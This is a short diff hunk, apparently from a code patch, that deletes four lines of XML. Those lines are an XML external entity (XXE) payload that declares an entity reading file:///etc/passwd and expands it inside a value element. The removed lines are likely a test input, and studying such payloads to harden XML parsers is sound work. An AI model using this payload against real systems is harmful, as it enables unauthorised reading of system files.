@@ -1,4 +1,0 @@
-    <!DOCTYPE data [
-     <!ENTITY ez SYSTEM "file:///etc/passwd">
-    ]>
-      <value>&ez;</value>
